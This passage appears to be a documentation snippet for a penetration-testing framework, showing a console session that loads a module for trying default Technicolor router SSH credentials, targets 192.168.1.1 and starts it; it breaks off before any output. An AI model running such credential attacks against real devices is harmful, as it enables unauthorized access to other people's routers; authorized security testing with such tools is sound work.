...
```
exf > use creds/routers/technicolor/ssh_default_creds
exf (Technicolor Router Default SSH Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Technicolor Router Default SSH Creds) > run
[*] Running module...
